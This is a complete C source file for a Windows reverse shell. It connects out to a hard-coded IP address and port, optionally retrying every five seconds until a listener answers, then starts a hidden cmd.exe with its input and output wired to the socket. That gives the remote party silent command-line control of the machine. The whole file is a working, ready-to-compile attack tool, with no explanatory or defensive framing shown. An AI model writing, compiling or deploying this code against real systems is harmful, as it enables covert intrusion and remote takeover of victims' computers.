#include <winsock2.h>
#include <Windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CLIENT_IP (char *)"192.168.1.10"
#define CLIENT_PORT (int)5555

int main(void)
{

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        write(2, "[ERROR] WSAStartup failed.\n", 27);
    }

    int port = CLIENT_PORT;
    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
    while (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0)
    {
        Sleep(5000);
    }
#else
    if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0)
    {
        write(2, "[ERROR] connect failed.\n", 24);
        return (1);
    }
#endif

    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES);
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;
    PROCESS_INFORMATION pinfo;
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

    return (0);
}